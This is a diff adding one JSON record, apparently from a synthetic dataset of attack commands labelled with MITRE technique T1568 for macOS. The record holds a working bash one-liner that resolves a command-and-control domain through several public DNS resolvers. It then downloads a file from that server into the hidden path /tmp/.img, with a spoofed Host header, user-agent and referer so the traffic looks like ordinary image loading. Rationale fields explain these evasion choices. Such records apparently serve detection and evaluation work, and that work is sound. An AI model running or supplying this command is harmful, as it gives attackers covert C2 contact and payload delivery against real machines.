@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1568",
+  "platform": "macOS",
+  "shell": "bash",
+  "command": "dom=\"update-cdn-images.net\"; ip=$(dig @1.1.1.1 +short A \"$dom\" | head -1); if [ -z \"$ip\" ]; then ip=$(dig @8.8.8.8 +short A \"$dom\" | head -1); fi; if [ -n \"$ip\" ]; then ua=\"Mozilla/5.0 (Macintosh; Intel Mac OS X) AppleWebKit/605.1.15\"; wget -q --header=\"Host: $dom\" --user-agent=\"$ua\" --referer=\"https://$dom/gallery\" --limit-rate=55k --timeout=7 \"http://$ip/photos/hero.jpg\" -O /tmp/.img; fi",
+  "explanation": "Performs dynamic resolution against multiple public DNS resolvers to obtain an active C2 IP, then retrieves a benign-looking image path using Host header to mimic image loading.",
+  "rationale_steps": [
+    "Query multiple DNS resolvers for resilience (dynamic resolution).",
+    "Contact IP directly with Host header to blend with CDN traffic.",
+    "Throttle rate and use referer to resemble normal browsing."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-6ea66e0e-51122a84",
+  "source_prompt_hash": "6ea66e0e",
+  "timestamp_utc": "2025-09-30T03:15:34.833319Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
